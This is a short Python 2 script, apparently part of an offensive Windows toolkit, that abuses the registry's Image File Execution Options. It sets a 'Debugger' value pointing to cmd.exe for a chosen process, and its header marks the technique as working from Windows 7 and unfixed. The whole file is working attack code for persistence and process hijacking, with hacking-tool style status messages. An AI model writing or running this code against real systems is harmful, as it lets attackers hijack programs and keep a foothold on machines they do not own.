"""
Works from: Windows 7
Fixed in: unfixed
"""
from __future__ import print_function
import os
import _winreg
from colorama import init, Fore
init(convert=True)

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def ifeo(processname):
	print(" {} ifeo: Attempting to create registry key".format(infoBox()))
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
					os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
					processname))
		_winreg.SetValueEx(key,
				"Debugger",
				0,
				_winreg.REG_SZ,
				payload)
		_winreg.CloseKey(key)
		print(" {} ifeo: Registry key created".format(successBox()))
	except Exception as error:
		print(" {} ifeo: Unable to create registry key".format(errorBox()))
		return False
